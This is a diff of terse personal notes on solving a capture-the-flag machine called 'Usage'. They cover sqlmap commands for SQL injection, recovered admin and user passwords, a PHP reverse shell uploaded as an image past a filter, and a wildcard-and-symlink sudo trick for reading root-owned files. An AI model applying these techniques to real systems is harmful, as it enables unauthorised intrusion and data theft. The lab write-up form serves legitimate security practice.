@@ -30,17 +30,27 @@ available databases [3]:
 [*] performance_schema
 [*] usage_blog
 
-      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog --tables
-      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog -T users
       
       dump is fucked up lets see another time ... maybe machine down 
       
       //15-06-2024 -> completing the machine 
+## admin.usage.htb    
+- [1] : Credentials
+   >>	admin:whatever1
       
+## user dash 
+
+- [1] : Php revershell through image
+  >>	Go to settings and snuggle a revshell , bypass it with burpsuite 
+
+## user xander
+      in .monitrc
+      admin:3nc0d3d_pa$$w0rd
+## root
+- [1] : sudo -l
+  >>	/usr/bin/usage_management 
+  >>	source (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
+		touch @root.txt
+		ln -s /file/you/want/to/read root.txt
        
---[+] :  Target IP :
 
-      >> 
---[+] :  Target IP :
-
-      >> 
